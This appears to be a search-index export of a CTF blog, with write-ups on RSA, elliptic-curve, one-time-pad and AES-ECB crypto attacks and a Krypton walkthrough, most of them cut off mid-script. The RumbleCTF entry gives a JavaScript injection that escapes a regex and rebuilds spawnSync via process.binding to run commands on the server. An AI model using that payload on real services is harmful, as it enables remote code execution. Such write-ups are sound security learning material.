[{"categories":["CTFs"],"content":"CSAW 2020 Finals crypto challenge","date":"08-11-2020","objectID":"/hybdrid2/","tags":["ctf","crypto"],"title":"CSAW 2020 Finals - hybrid2","uri":"/hybdrid2/"},{"categories":["CTFs"],"content":"In this crypto challenge we are provided with 3 files. encrypted_flag.txt, values.txt and RSA.py. This is their content respectively: gAAAAABfprGds2-Sl4iF5BMjjotnTDKFPsfL8AtJOOeeruqB4w8RGk5gNUt0JM0q2xDve9x9PNHkNkk7f9rf1LekcIBjT1MHIIrvIlnhGqunRRwX59Eo42M= n1:993026244695684152720385884540934236152899333556368140632626642931977663455763577814539451675010742634734414120506873127681575400889367126382788249627522167388706763687223391964637583980012499335053836288149762800461352926871 c1:919185245450085070842500396016408106190564102841807386352380063509870500097738484099609889796995083614948316196284397915697587992595215560226954302540303441147142319086774144200044451484633098049523092465251856761343186171446 n2:2120858645090903183026514121355650736640788936981118406136042282902569410681811232597743281933258598295558440757608733371867831987066752871107340815085437033645770613051826725100320202337307710202802730187794048230226233246437 c2:1208266765754514111395360277918056208640323550343906922007564328002144299927657437792873335826000580646064707967588174785153292261822967987055788013175865915201771920259922766547552097804855479381196953971070003030552476914575 n3:13566626315514098994196793247987944584439249998535190838667639010645726083604266690794903208593054256985816076154703189151830750410096794348919817516657177422145305767806102534164484511642213686511016911921215486685198372816147 c3:1217497400118662279329845790782375666818255286641902450369699752528387025736733412718188595857511268363598010406858933873651883505914392791968214369018429930629428806698086713411413268400019005784163187283297818419415844058298 n4:3781687268076859825619936261231343132436633759923146857815563164944282031661985906371461417791140109723961921392569564055561036370381503090194581545155223783851590130524287100727964018153092190082596699871644182610730089104887 c4:1581630010861681991426638552365806430756733284791722127829411178122452158350095552531779719660231210643815340517737141369431301977856820846393801475741850207897534313201631075802421935603144591231461900365190172816004331334424 e:5 import random import string from rsa_values import checkKeys, n1, n2, n3, n4, e def get_random_string(length): characters = string.ascii_letters+string.digits result = ''.join(random.choice(characters) for i in range(length)) return result def RSAEncrypt(password, n, e): c = (int(password.encode('utf-8').hex(),16) ** e) % n return c def main(): password = get_random_string(32) print(password) checkKeys() c1 = RSAEncrypt(password,n1,e) c2 = RSAEncrypt(password,n2,e) c3 = RSAEncrypt(password,n3,e) c4 = RSAEncrypt(password,n4,e) file = open(\"values.txt\",'w') file.write(\"n1:\" + str(n1) + '\\n') file.write(\"c1:\" + str(c1) + '\\n') file.write(\"n2:\" + str(n2) + '\\n') file.write(\"c2:\" + str(c2) + '\\n') file.write(\"n3:\" + str(n3) + '\\n') file.write(\"c3:\" + str(c3) + '\\n') file.write(\"n4:\" + str(n4) + '\\n') file.write(\"c4:\" + str(c4) + '\\n') file.write(\"e:\" + str(e) + '\\n') file.close() if __name__ == '__main__': main() So after reading the script we understand what’s going on. We have a password that is being encrypted using RSA. The exponent is constant and is equal to 5. There are 4 moduli and they are all different. We know this because these values are being written to values.txt. The last crucial piece written to that file is the resulting ciphertext of encrypting the password with a different modulo each. I was first mislead to believe this was a low exponent attack or a Hastad’s broadcast attack, but in this case the Hastad implied that we had as many ciphertexts and moduli as the value of the exponent (not the case 4 != 5). After eliminating those hypothesis I went back to the basics and tried to factor any of the modulo. So it happened the first modulo was factorizable. From that i wrote this script (clearly “inspired” from here). from Crypto.Util.number import inverse, long_to_bytes from factordb.factordb import FactorDB N = 9930262446956841527203858845409342361528993335","date":"08-11-2020","objectID":"/hybdrid2/:0:0","tags":["ctf","crypto"],"title":"CSAW 2020 Finals - hybrid2","uri":"/hybdrid2/"},{"categories":["CTFs"],"content":"CSAW 2020 Finals crypto challenge","date":"06-11-2020","objectID":"/eccentric/","tags":["ctf","crypto"],"title":"CSAW 2020 Finals - eccentric","uri":"/eccentric/"},{"categories":["CTFs"],"content":"This was the first challenge i solve for CSAW 2020 finals. It’s a crypto challenge that revolves around ECC (Elliptic Curve Cryptography). This is the content of the file provided. y^2 = x^3 + 2648089252143182574153823745896834765345361977855346851913065097972752819834370636007433949219153563353347621929792473352056603689300142308595500196681484715*x + 2640636613554195662803492377273397651071872147133797068159853320493797794760382065905880626537982439844385071174905293170870708493176922431618220384167739340 FF: 4079211623412602159436576854880565404392213421245358163957062650219138441233389311290884236330989600198400158483251311640833420916559186996716661065534756331 G = (2835124931680967399292763715241068733082955010482692941778975060177550045565873252916114065386731072675933657202784918206609499173114199830285672822076666812 : 3917051964324124246182777370059493628017925319159214920394084902768106573682907256149476836382399752202209827189288072241452544996871460642902049422562450204 : 1) P = (1201673966464508597332511457607538250497935144691770661539122404983678691094166105235067949576773833297917476372671447578123390251450634078667903889944175974 : 2549728089376241701979352238534953850683927781198029880111780652469308144313884103159306596064169377751896432424056208861929610592541122265583809022865481983 : 1) P = d*G d = ? So after googling a bit here, here and pain attention specifically here we can understand that we have a elliptic curve function in the first line with two major big numbers, the first one is the parameter a and the second one b. The next big number is what describes the Finite Field (hence FF). G is the generator coordinates, P is the public key coordinates which by definition is equal to d (the secret) times G. I googled more about elliptic curve attacks and found ones on small primes (which is not the case). After fiddling a bit with sage and these numbers i noticed that the order of the Elliptic Curve function and the Finite Field are the same. I searched to see if this was a problem and stumbled upon what’s called Smart’s Attack. After reading a bit on how it works (a lot of math to be honest), i found a solution online that solved the discrete logarithm for curves and fields in this specific situation. I tuned the parameters to my challenge and this is the resulting script. In the script the generator G is in fact P whereas the public key is Q. p = 4079211623412602159436576854880565404392213421245358163957062650219138441233389311290884236330989600198400158483251311640833420916559186996716661065534756331 A = 2648089252143182574153823745896834765345361977855346851913065097972752819834370636007433949219153563353347621929792473352056603689300142308595500196681484715 B = 2640636613554195662803492377273397651071872147133797068159853320493797794760382065905880626537982439844385071174905293170870708493176922431618220384167739340 xP = 2835124931680967399292763715241068733082955010482692941778975060177550045565873252916114065386731072675933657202784918206609499173114199830285672822076666812 yP = 3917051964324124246182777370059493628017925319159214920394084902768106573682907256149476836382399752202209827189288072241452544996871460642902049422562450204 xQ = 1201673966464508597332511457607538250497935144691770661539122404983678691094166105235067949576773833297917476372671447578123390251450634078667903889944175974 yQ = 2549728089376241701979352238534953850683927781198029880111780652469308144313884103159306596064169377751896432424056208861929610592541122265583809022865481983 E = EllipticCurve(GF(p), [0, 0, 0, A, B]) assert E.order() == p Qp = Qp(p, 2) Ep = EllipticCurve(Qp, [0, 0, 0, A, B]) yPp = sqrt(Qp(xP) ** 3 + Qp(A) * Qp(xP) + Qp(B)) Pp = Ep(Qp(xP), (-yPp, yPp)[yPp[0] == yP]) yQp = sqrt(Qp(xQ) ** 3 + Qp(A) * Qp(xQ) + Qp(B)) Qp = Ep(Qp(xQ), (-yQp, yQp)[yQp[0] == yQ]) print('Pp = {}'.format(Pp)) print('Qp = {}'.format(Qp)) print('-' * 40) lQ = Ep.formal_group().log()(- (p * Qp)[0] // (p * Qp)[1]) / p print('log(Q)","date":"06-11-2020","objectID":"/eccentric/:0:0","tags":["ctf","crypto"],"title":"CSAW 2020 Finals - eccentric","uri":"/eccentric/"},{"categories":["CTFs"],"content":"Writeup for the RumbleCTF CSRegex challenge. This is a javascript code injection challenge.","date":"02-11-2020","objectID":"/csregex/","tags":["ctf","injection"],"title":"RumbleCTF - CSRegex","uri":"/csregex/"},{"categories":["CTFs"],"content":"We are presented with an input where we can manipulate the regex match expression. We can easily escape the regex matching pattern by having our initial input as a/g);. After this we can input any Javascript code, and finally end with // to ignore the remaining characters. This code is running in some sort of context that doesn’t allow us to import or require libraries. Nevertheless after googleing for a while we come across an example to bind libraries using process.binding() and partially copying the code of child_process spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined\u0026\u0026(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};} // Defines spawnSync, the function that will do the actual spawning spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c\u003ca.stdio.length;c++){var e=a.stdio[c]\u0026\u0026a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output\u0026\u0026a.encoding\u0026\u0026a.encoding!=='buffer')for(c=0;c\u003cb.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output\u0026\u0026b.output[1],b.stderr=b.output\u0026\u0026b.output[2],b.error\u0026\u0026(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;} After having these two functions defined we can run any command by doing return spawnSync(\"cmd\", ['args', 'list']) This might be a bit overkill, but it was the solution i found. Now we can enumerate the whole system pretty much. After digging in the files if we cat the file /app/dockerfile one of the layers is to echo the flag. Done! 🙂 ","date":"02-11-2020","objectID":"/csregex/:0:0","tags":["ctf","injection"],"title":"RumbleCTF - CSRegex","uri":"/csregex/"},{"categories":["CTFs"],"content":"CSAW 2020 crypto challenge","date":"18-09-2020","objectID":"/perfect_secrecy/","tags":["ctf","crypto"],"title":"CSAW 2020 Qualifiers - perfect_secrecy","uri":"/perfect_secrecy/"},{"categories":["CTFs"],"content":"The challenge goes as follows: Alice sent over a couple of images with sensitive information to Bob, encrypted with a pre-shared key. It is the most secure encryption scheme, theoretically… These are the two images we have access to: One of the most secure encryption techniques that is theoretically uncrackable is One Time Pad. This technique relies completely on a single use per key rule. If this rule is broken and we XOR two encrypted contents together the encryption cancels out and we get the mix between both plaintexts. For example taking C1 and C2 as the resulting ciphertexts from XOR’ing plaintexts P1 and P2 with the same key K we get: C1 = P1 ^ K C2 = P2 ^ K C1 ^ C2 = P1 ^ K ^ P2 ^ K Since XOR is commutative and XOR’ing a value with itself it’s always 0, and 0 is the absorbing element, the last line is equivalent to: P1 ^ K ^ P2 ^ K = P1 ^ P2 ^ K ^ K = P1 ^ P2 ^ 0 = P1 ^ P2 When we XOR one image to the other we get the resulting image: ","date":"18-09-2020","objectID":"/perfect_secrecy/:0:0","tags":["ctf","crypto"],"title":"CSAW 2020 Qualifiers - perfect_secrecy","uri":"/perfect_secrecy/"},{"categories":["CTFs"],"content":"CSAW 2020 crypto challenge","date":"17-09-2020","objectID":"/modus_operandi/","tags":["ctf","crypto"],"title":"CSAW 2020 Qualifiers - modus_operandi","uri":"/modus_operandi/"},{"categories":["CTFs"],"content":"This is a crypto challenge from the CSAW 2020 CTF originally worth 150 points. The challenge initially tells us to connect as such: $ nc crypto.chal.csaw.io 5001 Hello! For each plaintext you enter, find out if the block cipher used is ECB or CBC. Enter \"ECB\" or \"CBC\" to get the flag! We need to tell if the cipher being used to encode our plaintext is ECB or CBC. The big difference is that ECB, which stands for Electronic Code Book, always produces the same ciphertext for a given block. The first thing to do is figure out the cipher block size. We can do this easily by entering only a letter and check out the size of the output. $ nc crypto.chal.csaw.io 5001 (INITIAL MESSAGE) Enter plaintext: a Ciphertext is: 333b2ddd618ce8a23993af9e094d7769 ECB or CBC? We got 333b2ddd618ce8a23993af9e094d7769 as the ciphertext. Since this is hexadecimal representation, every character is 4 bits, thus making our block size 128 bits (4 * 32). So to differentiate ECB from CBC we only need to send enough characters in the plaintext and then split our ciphertext every 32 characters (128 bits) and compare the first block of the ciphertext with the second. If these are equal then it’s ECB, otherwise it’s CBC. I coded this into python and this is the result: #!/usr/bin/python3 from pwn import * p = remote('crypto.chal.csaw.io', 5001) modes_seq = [] def solve(): global p global modes_seq counter = 1 plaintext = (\"a\" * 32) # receive initial message p.recvlineS(keepends=False) while True: # receive plaintext prompt p.recvlineS(keepends=False) # send plaintext p.sendline(plaintext) # receive header from line with ciphertext p.recvuntilS(\"Ciphertext is:\") # receive ciphertext cipher = p.recvlineS().strip() # receive ECB or CBC prompt p.recvlineS(keepends=False) # check if it is ECB is_ecb = check_equal_with_bs(cipher) # send cipher mode if is_ecb: p.sendline('ECB') else: p.sendline('CBC') print(f\"cipher {counter}\") counter *+= 1 def check_equal_with_bs(cipher): bs = 32 b0 = cipher[:bs] b1 = cipher[bs:bs*2] if b0 == b1: return True solve() We will send 32 characters since these make up 32 bytes (256 bits), to make our 2 blocks. When we run it we get: python3 solve.py [+] Opening connection to crypto.chal.csaw.io on port 5001: Done cipher 1 cipher 2 cipher 3 cipher 4 (...) cipher 174 cipher 175 cipher 176 Traceback (most recent call last): ( EXCEPTION INFO ) EOFError It gave us an EOF after a while. After trying a couple of times we would understand this behaviour is recurrent. After fiddling a bit (a lot actually) we can get to the result by checking out the cipher modes sequence. # got this from tweaking the previous script mode_seqs = ['ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'ECB', 'ECB', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'ECB', 'ECB', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'ECB', 'ECB', 'ECB', 'ECB', 'CBC', 'ECB', 'ECB', 'CBC', 'ECB', 'CBC', 'CBC', 'CBC', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'ECB', 'ECB', 'ECB', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'CBC', 'CBC', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'CBC', 'ECB', 'CBC', 'CBC', 'ECB', 'ECB', 'CBC', 'ECB', 'ECB', 'CBC', 'ECB', 'ECB', 'ECB', 'CBC', 'CBC', 'CBC', 'CBC', 'CBC', 'ECB', 'CBC'] binary = \"\" for mode in mode_seqs: if mode == \"ECB\": binary += \"0\" else: binary += \"1\" print(binary) Our resultin","date":"17-09-2020","objectID":"/modus_operandi/:0:0","tags":["ctf","crypto"],"title":"CSAW 2020 Qualifiers - modus_operandi","uri":"/modus_operandi/"},{"categories":["CTFs"],"content":"Writeup for the UTCTF Random ECB challenge. This is an AES ECB known plaintext attack.","date":"09-03-2020","objectID":"/utctf_random_ecb/","tags":["ctf","crypto"],"title":"UTCTF - Random ECB","uri":"/utctf_random_ecb/"},{"categories":["CTFs"],"content":"Introduction First and foremost there is a very good explanation how AES ECB can be exploited through a chosen plaintext attack here. The problem can be visualized in these two pictures: As you can see even though the image was encrypted, Tux (the penguin) is still sort of visible in the result. This is due to the fact that AES ECB works in a standard codebook fashion, where each input has a ciphertext associated. This meaning that if you encrypt the same block over and over, the result will be exactly the same. Knowing this we can devise a chosen plaintext attack. The attack is very easy to understand, and if i am not clear enough or confuse you please go check the link that i mentioned previously. In sum, the attack can be done by sending plaintext with block_size-1 length, letting one of the secret bytes into our block. Then the plaintext of that block is all known except the last byte, so we just need to brute force the last byte. Easy right? Now onto the challenge. ","date":"09-03-2020","objectID":"/utctf_random_ecb/:0:0","tags":["ctf","crypto"],"title":"UTCTF - Random ECB","uri":"/utctf_random_ecb/"},{"categories":["CTFs"],"content":"Challenge The challenge made available the server source code, so let’s take a look at it. from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Random import get_random_bytes from Crypto.Random.random import getrandbits from secret import flag KEY = get_random_bytes(16) def aes_ecb_encrypt(plaintext, key): cipher = AES.new(key, AES.MODE_ECB) return cipher.encrypt(plaintext) def encryption_oracle(plaintext): b = getrandbits(1) plaintext = pad((b'A' * b) + plaintext + flag, 16) return aes_ecb_encrypt(plaintext, KEY).hex() if __name__ == '__main__': while True: print(\"Input a string to encrypt (input 'q' to quit):\") user_input = input() if user_input == 'q': break output = encryption_oracle(user_input.encode()) print(\"Here is your encrypted string, have a nice day :)\") print(output) So at first there are no easy shortcuts, like the key being in plaintext (it’s 16 random bytes). The function aes_ecb_encrypt is responsible for doing the encryption itself, and it’s called in encryption_oracle. The latter is more interesting, since it first calls the getrandbits function. After a google search we can confirm the function does what was expected: Crypto.Random.random.getrandbits(N): Return a random integer, at most N bits long. So pretty much it’s generating a number with at most 1 bit. With 1 bit it can only be either 0 or 1. Since this number is then multiplied by ‘A’, the result will be a string with length 0 or 1, so it’s either adding one byte of padding or not adding padding at all. The string that makes the plaintext is composed first by this padding, then the plaintext that we send, and finally the flag. The way i tackled this challenge was by making a python script that was split into three main stages. First getting what was considered the correct first block. In order to do this i generated two full blocks of padding and send them. ‘Why two?' you might be asking, well if we only sent one we would not know if a random byte was added or not, so by sending two, we can be sure that if the first block is equal to the second, no random bytes were added (remember to make your padding different than theirs, in other words don’t use A for your padding, i made that mistake :) ). After getting a result where the first block is equal to the second we can use the first block as what determines if the result has or not a random byte. In case the first block retrieved is equal to what we just saw we can conclude that no bytes were added. Then we have a stage where we find the target, in other words, we send a padding block plus a block with length block_size-1, allowing a byte from the secret to fall into our block. We then get the encrypted result and store this as “the target”. Finally we have the last stage. This stage is where we brute force the byte that was encrypted in “the target”. In order to to this we send the same block sent previously with block_size-1 bytes and append a. If what we get back is the same, then we know that the secret started with an a. If it’s different we try b, and keep going through the whole alphabet and symbols until we eventually get the same encrypted block back. After we get our first byte we just have to remove a byte from our padding (that was block_size-1 long) making it block_size-2 long, which will let 2 bytes from the secret into our block that will be bruteforced. We already know the first, so we just need to bruteforce the second one. This is then repeated until we get the whole flag. This is the final python script: import sys import socket from textwrap import wrap import string hostname = \"ecb.utctf.live\" port = 9003 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((hostname, port)) reader = sock.makefile('rw') ignore = [\"Input a string to encrypt (input 'q' to quit):\", \"Here is your encrypted string, have a nice day :)\"] print(reader.readline()) block_size = 16 final_blocks = 'B'*block_size*2 alphabet = string.ascii_letters + string.digits + \" .[","date":"09-03-2020","objectID":"/utctf_random_ecb/:1:0","tags":["ctf","crypto"],"title":"UTCTF - Random ECB","uri":"/utctf_random_ecb/"},{"categories":["Posts"],"content":"This is a vigenère cipher tool written in rust that can decrypt and encrypt.","date":"04-09-2019","objectID":"/rugenere/","tags":["rust","crypto"],"title":"rugenere - Vigenère Cipher tool written in Rust","uri":"/rugenere/"},{"categories":["Posts"],"content":"I had extra time, and really wanted to get into rust development, so i challenged myself to start a new project. One of my friends was in the exact same position and decided to do a simple Caesar’s cipher tool. He suggested that i do one for the Vigenère cipher since both of these ciphers are used in Over The Wire challenges. In fact Krypton has challenges that use both of these ciphers, you can check my walkthrough of Krypton here. I added my project to crates.io so other people can have an easy deployment experience. The github page is also documented and as an extra challenge i deployed a TravisCI pipeline to check for build errors on each commit. Overall i believe this project didn’t explore ALL of rust’s “special” concepts, even though it fulfilled my objective of getting into rust in a more committed way. ","date":"04-09-2019","objectID":"/rugenere/:0:0","tags":["rust","crypto"],"title":"rugenere - Vigenère Cipher tool written in Rust","uri":"/rugenere/"},{"categories":["Posts"],"content":"rugenere github crates.io ","date":"04-09-2019","objectID":"/rugenere/:0:1","tags":["rust","crypto"],"title":"rugenere - Vigenère Cipher tool written in Rust","uri":"/rugenere/"},{"categories":["Posts"],"content":"This is a walkthrough of the Krypton challenge provided by Over The Wire.","date":"07-07-2019","objectID":"/krypton/","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Introduction Over The Wire provides multiple challenges focused on different topics of computer systems. The one which we will solve here is Krypton. This is challenge is focused on cryptography. You can read more about the challenge and how it works here. Levels: Level 0 Level 1 Level 2 Level 3 Level 4 Level 5 Level 6 ","date":"07-07-2019","objectID":"/krypton/:0:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Level 0 The password is a base64 encoded string. We can use the base64 command. Let’s check the manual. NAME base64 - base64 encode/decode data and print to standard output SYNOPSIS base64 [OPTION]... [FILE] DESCRIPTION Base64 encode or decode FILE, or standard input, to standard output. With no FILE, or when FILE is -, read standard input. Mandatory arguments to long options are mandatory for short options too. -d, --decode decode data This is exactly what we want. We wneed to use the -d flag to decode, and we will pipeline the string with the echo command. \u003e echo \"S1JZUFRPTklTR1JFQVQ=\" | base64 -d KRYPTONISGREAT% \u003e The % does not make part of the string from what i understand. This password allows us to connect to krypton.labs.overthewire.org as krypton1 on port 2222. From now on the files that we need for the challenges will be in the /krypton/ directory. ","date":"07-07-2019","objectID":"/krypton/:1:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Level 1 As we’ve mentioned before all the challenges from now on will be in the /krypton/ directory so if we go there and list the files we get this. krypton1@krypton:/krypton$ ls -la total 32 drwxr-xr-x 8 root root 4096 Jul 1 04:21 . drwxr-xr-x 92 root root 4096 Jul 7 14:54 .. drwxr-xr-x 2 root root 4096 Jul 1 04:20 krypton1 drwxr-xr-x 2 root root 4096 Jul 1 04:20 krypton2 drwxr-xr-x 2 root root 4096 Jul 1 04:20 krypton3 drwxr-xr-x 2 root root 4096 Jul 1 04:20 krypton4 drwxr-xr-x 2 root root 4096 Jul 1 04:20 krypton5 drwxr-xr-x 3 root root 4096 Jul 1 04:21 krypton6 We are currently in Level 1 so let’s change to the correct folder and list its content. krypton1@krypton:/krypton$ cd krypton1 krypton1@krypton:/krypton/krypton1$ ls -la total 16 drwxr-xr-x 2 root root 4096 Jul 1 04:20 . drwxr-xr-x 8 root root 4096 Jul 1 04:21 .. -rw-r----- 1 krypton1 krypton1 882 Jul 1 04:20 README -rw-r----- 1 krypton1 krypton1 26 Jul 1 04:20 krypton2 We should check out the README to get more insight on this challenge. Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file ‘krypton2’. It is ‘encrypted’ using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! ROT13 should be easy. We’ve messed with this previously in Bandit using the tr command. There is a simple example in the wiki page of ROT13 with an implementation of ROT13 using the tr command. krypton1@krypton:/krypton/krypton1$ cat krypton2 | tr 'N-ZA-Mn-za-m' 'A-Za-z' LEVEL TWO PASSWORD ROTTEN We switched the letter patterns since the example is to encode and we want to decode. We have the password for the next level, let’s go. ","date":"07-07-2019","objectID":"/krypton/:2:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Level 2 From now on i’ll just change the to the challenge directory and cat the README.md without pasting it here explicitly. Krypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a ‘monoalphebetic’ cipher. Monoalphebetic means, literally, “one alphabet” and you will see why. This level contains an old form of cipher called a ‘Caesar Cipher’.A Caesar cipher shifts the alphabet by a set number. For example: plain: a b c d e f g h i j k … cipher: G H I J K L M N O P Q … In this example, the letter ‘a’ in plaintext is replaced by a ‘G’ in the ciphertext so, for example, the plaintext ‘bad’ becomes ‘HGJ’ in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break. You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The encrypt binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the encrypt binary runs setuid krypton3, you also need to give krypton3 access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat So we have to figure out what’s the rotation in this case. We should be able to do that by just encrypting the letter a. krypton2@krypton:/krypton/krypton2$ ./encrypt usage: encrypt foo - where foo is the file containing the plaintext We need to create a file. Let’s create a temporary directory and a file containing just the letters aA then. krypton2@krypton:/krypton/krypton2$ mkdir /tmp/tempfolder krypton2@krypton:/krypton/krypton2$ vi /tmp/tempfolder/testFile krypton2@krypton:/krypton/krypton2$ cat /tmp/tempfolder/testFile aA We also need to link the keyfile.dat to our temporary directory and then give permissions so the binary can run. krypton2@krypton:/krypton/krypton2$ cd /tmp/tempfolder krypton2@krypton:/tmp/tempfolder$ ln -s /krypton/krypton2/keyfile.dat krypton2@krypton:/tmp/tempfolder$ chmod 777 . krypton2@krypton:/tmp/tempfolder$ ls -la total 12 drwxrwxrwx 2 krypton2 krypton2 4096 Jul 7 15:30 . drwxrwx-wt 3 root root 4096 Jul 7 15:32 .. lrwxrwxrwx 1 krypton2 krypton2 29 Jul 7 15:30 keyfile.dat -\u003e /krypton/krypton2/keyfile.dat -rw-rw-r-- 1 krypton2 krypton2 2 Jul 7 15:27 testFile Now we just need to run the binary on the file we’ve just created. krypton2@krypton:/tmp/tempfolder$ /krypton/krypton2/encrypt testFile krypton2@krypton:/tmp/tempfolder$ ls -la total 16 drwxrwxrwx 2 krypton2 krypton2 4096 Jul 7 15:33 . drwxrwx-wt 3 root root 4096 Jul 7 15:33 .. -rw-rw-r-- 1 krypton3 krypton2 1 Jul 7 15:33 ciphertext lrwxrwxrwx 1 krypton2 krypton2 29 Jul 7 15:30 keyfile.dat -\u003e /krypton/krypton2/keyfile.dat -rw-rw-r-- 1 krypton2 krypton2 2 Jul 7 15:27 testFile Let’s check the resulting ciphertext. krypton2@krypton:/tmp/tempfolder$ cat ciphertext MM So that tells us that it’s rotating from aA to MM. So to decode we just have to do the other way around. Let’s modify our previous tr command with the rotation we want. We had tr 'N-ZA-Mn-za-m' 'A-Za-z' now what we want is to rotate from M to A. You should end up with tr 'M-ZA-L' 'A-Z'. Let’s try it on our file to see if we get our AA back. As we’ve seen before the encryption rotates any letter to uppercase no matter ","date":"07-07-2019","objectID":"/krypton/:3:0","tags":["beginner","crypto"],"title":"Over The Wire - Krypton Walkthrough","uri":"/krypton/"},{"categories":["Posts"],"content":"Level 3 As always first check the README.md, Well done. You’ve moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file ‘krypton4’. You have also found 3 other files. (found1, found2, found3) You know the following important details: The message plaintexts are in English (*** very important) They were produced from the same key (*** even better!) Enjoy. In this case we don’t have access to the encryption method. I know for a fact that these types of ciphers are weak to attacks based on frequency analysis, this meaning that for example in the english language the most common letter is e so in the text that we have, the letter that appears the most times, SHOULD be the result of rotating e. And from that point we can calculate the key. Let’s find a website that does frequency analysis of text. I found this one https://www.dcode.fr/frequency-analysis. After pasting all of the found* files content we get this output on the website: So now we know that the most common letter in the text is S so we could assume that to decode we need to perform this rotation tr 'S-ZA-R' 'E-ZA-D'. Let’s try it then, krypton3@krypton:/krypton/krypton3$ cat krypton4 | tr 'S-ZA-R' 'E-ZA-D' WEHHI NSEVP EHEUE HJNYZ KCGGW NZIOG MZYVE Hmmm… Doesn’t seem like it’s correct. After reading the README.md again i understand what i did wrong… I was assuming that this was a rotation cipher again. It’s not it’s substitution. So what we actually have to do is replace the most common letter in the analysis by the most common letter in the english alphabet, and so on. We can use a quick python script. I got this english frequency, “EARIOTNSLCUDPMHGBFYWKVXZJQ”, from here. real_freq = \"EARIOTNSLCUDPMHGBFYWKVXZJQ\" cipher_freq = \"SQJUBNCGDZVWMYTXKELAFIOHRP\" cipher_text = \"KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS\" real_text = 